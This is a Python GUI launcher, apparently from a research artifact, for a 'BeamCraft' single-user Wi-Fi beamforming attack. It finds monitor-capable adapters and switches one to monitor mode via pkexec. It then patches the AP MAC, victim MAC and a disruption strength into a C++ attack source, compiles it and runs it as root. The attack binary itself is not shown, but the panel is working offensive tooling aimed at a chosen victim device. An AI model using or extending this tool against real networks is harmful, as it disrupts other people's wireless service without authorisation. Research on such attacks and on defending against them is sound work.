#!/usr/bin/env python3
"""GUI front-end for the BeamCraft SU attack: scan hardware, set monitor
mode, patch + compile main_su.cpp, then run it — all from one panel.

ponytail: SU mode only. MU mode's filter_exp has a 5-address multi-victim
pattern (see main_mu.cpp) — extend patch_source()/extract_current() with an
MU variant when that objective comes up, same regex approach.
"""
import re
import subprocess
import tkinter as tk
from pathlib import Path
from tkinter import scrolledtext, ttk

HERE = Path(__file__).resolve().parent
BEAMCRAFT_AE = HERE.parent / "BeamCraft_AE"
SRC = BEAMCRAFT_AE / "main_su.cpp"
BIN = BEAMCRAFT_AE / "main_su"

MAC_RE = r"[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}"


# ---------------------------------------------------------------- config patching

def extract_current(text: str) -> dict:
    dev = re.search(r'char \*dev = "([^"]*)"', text)
    filt = re.search(r'char filter_exp\[\] = "(.*?)";', text)
    alpha = re.search(r"const float alpha = ([\d.]+);", text)
    macs = re.findall(MAC_RE, filt.group(1)) if filt else []
    return {
        "iface": dev.group(1) if dev else "",
        "ap_mac": macs[0] if macs else "",
        "victim_mac": macs[1] if len(macs) > 1 else "",
        "alpha": alpha.group(1) if alpha else "1",
    }


def patch_source(text: str, iface: str, ap_mac: str, victim_mac: str, alpha: str) -> str:
    text = re.sub(r'char \*dev = "[^"]*"', f'char *dev = "{iface}"', text)
    text = re.sub(r'pcap_create\("[^"]*", pcap_errbuf\)', f'pcap_create("{iface}", pcap_errbuf)', text)
    text = re.sub(r"const float alpha = [\d.]+;", f"const float alpha = {alpha};", text)

    def replace_filter(m: re.Match) -> str:
        body = m.group(1)
        macs_seen = {"n": 0}
        new_macs = [ap_mac, victim_mac]

        def sub_mac(mm: re.Match) -> str:
            i = macs_seen["n"]
            macs_seen["n"] += 1
            return new_macs[i] if i < len(new_macs) else mm.group(0)

        return 'char filter_exp[] = "' + re.sub(MAC_RE, sub_mac, body) + '";'

    text = re.sub(r'char filter_exp\[\] = "(.*?)";', replace_filter, text, count=1)
    return text


# ---------------------------------------------------------------- hardware scan

def parse_iw_dev(text: str) -> list[dict]:
    """Parse `iw dev` output into [{phy, iface, mac, type}, ...], real interfaces only."""
    entries = []
    phy = None
    current: dict | None = None
    for line in text.splitlines():
        phy_m = re.match(r"phy#(\d+)", line)
        if phy_m:
            phy = f"phy{phy_m.group(1)}"
            continue
        iface_m = re.match(r"\tInterface (\S+)", line)
        if iface_m:
            current = {"phy": phy, "iface": iface_m.group(1), "mac": "", "type": ""}
            entries.append(current)
            continue
        if current is None:
            continue
        addr_m = re.match(r"\t\taddr (\S+)", line)
        if addr_m:
            current["mac"] = addr_m.group(1)
        type_m = re.match(r"\t\ttype (\S+)", line)
        if type_m:
            current["type"] = type_m.group(1)
    return entries


def phy_supports_monitor(phy_info_text: str) -> bool:
    idx = phy_info_text.find("Supported interface modes:")
    if idx == -1:
        return False
    section = phy_info_text[idx:]
    end = section.find("\nBand ")
    if end != -1:
        section = section[:end]
    return "* monitor" in section


def driver_for_iface(iface: str) -> str:
    try:
        return Path(f"/sys/class/net/{iface}/device/driver").resolve().name
    except OSError:
        return "unknown"


def iface_has_ip(iface: str) -> bool:
    out = subprocess.run(["ip", "-o", "-4", "addr", "show", iface], capture_output=True, text=True).stdout
    return bool(out.strip())


def scan_hardware() -> list[dict]:
    """Live hardware scan — every real WiFi interface plus monitor-mode capability,
    driver, and whether it looks like it's currently your internet connection."""
    iwdev = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
    results = []
    for entry in parse_iw_dev(iwdev):
        phy_info = subprocess.run(["iw", "phy", entry["phy"], "info"], capture_output=True, text=True).stdout
        entry["monitor_capable"] = phy_supports_monitor(phy_info)
        entry["driver"] = driver_for_iface(entry["iface"])
        entry["has_ip"] = iface_has_ip(entry["iface"])
        results.append(entry)
    return results


# ---------------------------------------------------------------- privileged command builders

def monitor_mode_cmd(iface: str, channel: str) -> str:
    cmd = f"ip link set {iface} down && iw dev {iface} set type monitor && ip link set {iface} up"
    if channel:
        cmd += f" && iw dev {iface} set channel {channel}"
    return cmd


def managed_mode_cmd(iface: str) -> str:
    return f"ip link set {iface} down && iw dev {iface} set type managed && ip link set {iface} up"


def run_everything_cmd(iface: str, channel: str, binary_path: str) -> str:
    return monitor_mode_cmd(iface, channel) + f" && exec {binary_path}"


# ---------------------------------------------------------------- GUI

class App(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Beam Warden — Attack Control Panel")
        self.geometry("760x600")
        self.proc: subprocess.Popen | None = None
        self.hw: list[dict] = []

        current = extract_current(SRC.read_text())

        # -- Hardware section --
        hw_frame = ttk.LabelFrame(self, text="1. Hardware", padding=10)
        hw_frame.pack(fill="x", padx=10, pady=(10, 4))
        ttk.Button(hw_frame, text="Scan for WiFi Adapters", command=self.scan).grid(row=0, column=0, sticky="w")
        self.hw_list = tk.Listbox(hw_frame, height=4)
        self.hw_list.grid(row=1, column=0, columnspan=2, sticky="ew", pady=4)
        hw_frame.columnconfigure(1, weight=1)

        pick_row = ttk.Frame(hw_frame)
        pick_row.grid(row=2, column=0, columnspan=2, sticky="w")
        ttk.Label(pick_row, text="Attacker NIC:").pack(side="left")
        self.iface = tk.StringVar(value=current["iface"])
        self.iface_box = ttk.Combobox(pick_row, textvariable=self.iface, width=15, state="readonly")
        self.iface_box.pack(side="left", padx=4)
        ttk.Label(pick_row, text="Channel:").pack(side="left", padx=(12, 0))
        self.channel = tk.StringVar(value="153")
        ttk.Entry(pick_row, textvariable=self.channel, width=6).pack(side="left", padx=4)
        ttk.Button(pick_row, text="Set Monitor Mode", command=self.set_monitor_mode).pack(side="left", padx=8)
        ttk.Button(pick_row, text="Restore Managed Mode", command=self.set_managed_mode).pack(side="left")

        # -- Attack config section --
        cfg_frame = ttk.LabelFrame(self, text="2. Attack Config", padding=10)
        cfg_frame.pack(fill="x", padx=10, pady=4)
        self.ap_mac = self._row(cfg_frame, 0, "AP MAC (addr2, NDP sender)", current["ap_mac"])
        self.victim_mac = self._row(cfg_frame, 1, "Victim MAC (addr2, BFI sender)", current["victim_mac"])
        self.alpha = self._row(cfg_frame, 2, "Alpha (0=full disrupt, 1=no attack)", current["alpha"])

        # -- Actions --
        btns = ttk.Frame(self, padding=10)
        btns.pack(fill="x")
        ttk.Button(btns, text="3. Apply & Compile", command=self.compile).pack(side="left", padx=4)
        self.run_btn = ttk.Button(btns, text="4. Run Everything (monitor mode + attack)", command=self.toggle_run)
        self.run_btn.pack(side="left", padx=4)

        self.log = scrolledtext.ScrolledText(self, height=20, bg="black", fg="#0f0")
        self.log.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        self.scan()

    def _row(self, parent: ttk.Frame, r: int, label: str, default: str) -> tk.StringVar:
        ttk.Label(parent, text=label).grid(row=r, column=0, sticky="w", pady=2)
        var = tk.StringVar(value=default)
        ttk.Entry(parent, textvariable=var, width=30).grid(row=r, column=1, sticky="w")
        return var

    def println(self, msg: str) -> None:
        self.log.insert("end", msg + "\n")
        self.log.see("end")
        self.update_idletasks()

    # -- hardware --
    def scan(self) -> None:
        self.hw = scan_hardware()
        self.hw_list.delete(0, "end")
        monitor_capable = []
        for e in self.hw:
            flag = "monitor-capable" if e["monitor_capable"] else "NO monitor support"
            in_use = " [in use for internet]" if e["has_ip"] else ""
            self.hw_list.insert(
                "end", f"{e['iface']}  ({e['driver']}, {e['type']}, {flag}){in_use}"
            )
            if e["monitor_capable"]:
                monitor_capable.append(e["iface"])
        self.iface_box["values"] = monitor_capable
        if not monitor_capable:
            self.println("No monitor-capable WiFi adapter found. Plug in the Alfa AWUS036ACM and scan again.")
        elif not self.iface.get() or self.iface.get() not in monitor_capable:
            self.iface.set(monitor_capable[0])
        self.println(f"Scan found {len(self.hw)} WiFi interface(s), {len(monitor_capable)} monitor-capable.")

    def set_monitor_mode(self) -> None:
        iface = self.iface.get()
        if not iface:
            self.println("Pick an attacker NIC first.")
            return
        self.println(f"Setting {iface} to monitor mode on channel {self.channel.get()} (pkexec prompt incoming)...")
        result = subprocess.run(["pkexec", "sh", "-c", monitor_mode_cmd(iface, self.channel.get())],
                                 capture_output=True, text=True)
        self.println(result.stdout + result.stderr or "Monitor mode set.")

    def set_managed_mode(self) -> None:
        iface = self.iface.get()
        if not iface:
            return
        self.println(f"Restoring {iface} to managed mode...")
        result = subprocess.run(["pkexec", "sh", "-c", managed_mode_cmd(iface)], capture_output=True, text=True)
        self.println(result.stdout + result.stderr or "Managed mode restored.")

    # -- compile --
    def compile(self) -> None:
        patched = patch_source(
            SRC.read_text(), self.iface.get(), self.ap_mac.get(), self.victim_mac.get(), self.alpha.get()
        )
        SRC.write_text(patched)
        self.println(f"Patched {SRC.name} — compiling...")
        cmd = ["g++", str(SRC), "-o", str(BIN), "-I/usr/include/eigen3/", "-L/usr/lib", "-lpcap", "-pthread", "-O3"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        self.println(result.stdout + result.stderr or "(compiled clean, no warnings)")
        self.println("Done." if result.returncode == 0 else "COMPILE FAILED.")

    # -- run --
    def toggle_run(self) -> None:
        if self.proc is None:
            if not BIN.exists():
                self.println("No binary yet — click 'Apply & Compile' first.")
                return
            iface = self.iface.get()
            if not iface:
                self.println("Pick an attacker NIC first.")
                return
            self.println(
                f"Setting {iface} to monitor mode + launching attack via pkexec "
                "(one password prompt for both steps)..."
            )
            cmd = run_everything_cmd(iface, self.channel.get(), str(BIN))
            self.proc = subprocess.Popen(
                ["pkexec", "sh", "-c", cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            self.run_btn.config(text="Stop")
            self._pump_output()
        else:
            self.println("Stopping (terminate) — if it lingers, run: sudo pkill main_su")
            self.proc.terminate()
            self.proc = None
            self.run_btn.config(text="4. Run Everything (monitor mode + attack)")

    def _pump_output(self) -> None:
        if self.proc is None or self.proc.stdout is None:
            return
        line = self.proc.stdout.readline()
        if line:
            self.println(line.rstrip())
        if self.proc.poll() is None:
            self.after(50, self._pump_output)
        else:
            self.println(f"Process exited ({self.proc.returncode}).")
            self.proc = None
            self.run_btn.config(text="4. Run Everything (monitor mode + attack)")


if __name__ == "__main__":
    App().mainloop()
